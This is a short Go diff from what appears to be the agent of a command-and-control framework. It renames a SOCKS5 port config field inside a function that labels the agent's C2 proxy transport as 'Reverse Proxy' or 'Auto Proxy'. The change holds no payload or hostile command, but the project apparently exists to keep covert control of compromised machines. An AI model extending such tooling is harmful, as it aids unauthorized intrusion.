@@ -32,7 +32,7 @@ func genC2TransportString() (transport_str string) {
 		if proxyURL.Port() == common.RuntimeConfig.AgentSocksServerPort && proxyURL.Hostname() == "127.0.0.1" {
 			return fmt.Sprintf("Reverse Proxy: %s", common.RuntimeConfig.C2TransportProxy)
 		}
-		if proxyURL.Port() == common.RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
+		if proxyURL.Port() == common.RuntimeConfig.Socks5LocalPort && proxyURL.Hostname() == "127.0.0.1" {
 			return fmt.Sprintf("Auto Proxy: %s", common.RuntimeConfig.C2TransportProxy)
 		}
 
